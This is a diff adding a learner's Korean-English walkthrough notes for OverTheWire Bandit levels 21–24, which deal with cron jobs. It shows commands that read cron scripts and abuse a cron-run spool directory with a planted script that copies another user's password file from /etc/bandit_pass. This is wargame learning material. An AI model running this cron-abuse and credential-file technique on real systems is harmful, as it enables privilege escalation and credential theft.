@@ -538,5 +538,125 @@ Notes:
 
 _Date 2025-12-19_ #20단계까지 CLEAR! 하지만 갈 길이 멀다!!!
 
-  
 
+## Bandit Level 21 -> 22
+Goal:A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+Command:
+```bash
+$ cd /etc/cron.d
+$ ls
+behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
+clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job  sysstat
+$ cat cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+#So, the password is stored in this path!
+$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+password #XD
+```
+
+Notes:
+ - ⚠️ cron이 뭐야?
+ - 🤖 cron은 일정 시간마다 자동으로 명령이나 스크립트를 실행해주는 리눅스 스케줄러라, 이 레벨에서는 그 자동 실행 스크립트를 이용해 비밀번호가 저장되는 파일을 찾아 읽는 것이 핵심이다.
+
+## Bandit Level 22 -> 23
+Goal:A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+Command:
+```bash
+$ cd /etc/cron.d
+$ cat cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+$ whoami
+bandit22
+#I have to find the password of bandit23, so I change my name bandit23!
+$ myname=bandit23
+$ mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+$ cat /tmp/$mytarget
+password #XD!
+```
+
+Notes:
+ - ⚠️ | md5sum | cut -d ' ' -f 1)은 머임?
+ - 🤖 | md5sum | cut -d ' ' -f 1 은 문자열을 MD5 해시로 변환한 뒤, 공백 기준으로 잘라 첫 번째 필드만 추출해서 깔끔한 해시 값만 사용하도록 만드는 과정이다.
+
+## Bandit Level 23 -> 24
+Goal:A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+Command:
+```bash
+$ cd /etc/cron.d
+$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+# This cron job executes every file inside that directory and then deletes them.
+# So I need to create a script that extracts the password and place it in that path so the cron job will execute it for me.
+$ cd /tmp
+$ mkdir hope
+$ cd hope
+$ nano script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/hope
+#saved!
+$ ls -l script.sh
+-rw-rw-r-- 1 bandit23 bandit23 54 Dec 25 23:27 script.sh
+$ chmod o+wx script.sh #Because an external file needs to be placed here, I have to grant write permission to others.
+$ cp script.sh /var/spool/bandit24/foo
+#Wait a moment
+$ ls
+script.sh #Wait... what?
+$ ls
+script.sh
+$ ls
+script.sh #OMG wait....! Oh I forgot to specify the filename!!!!!! HOLLLLLLLLLLLLLLLY
+$ nano
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/hope/bandit24
+#saved
+$ chmod 777 script.sh
+$ mv script.sh /var/spool/bandit24/foo #SPEEEEEEEEEEEED
+#Wait a moment!
+$ ls
+banddit24
+$ cat bandit24
+password #Correct!!!!
+```
+
+Notes:
+ - ⚠️ 너무 다급해서 내가 뭘한지 모르겠다 ㅠ.ㅠ 복습해야겠다.
+ - 🤖 chmod 777 은 모든 사용자에게 읽기·쓰기·실행 권한을 전부 열어주는 위험한 설정으로, 보안 환경에서는 불필요한 권한 확장을 초래할 수 있기 때문에 실제 운영 환경에서는 권장되지 않는다. 이 문제에서는 실행만 필요하므로 chmod +x 정도면 충분하다.
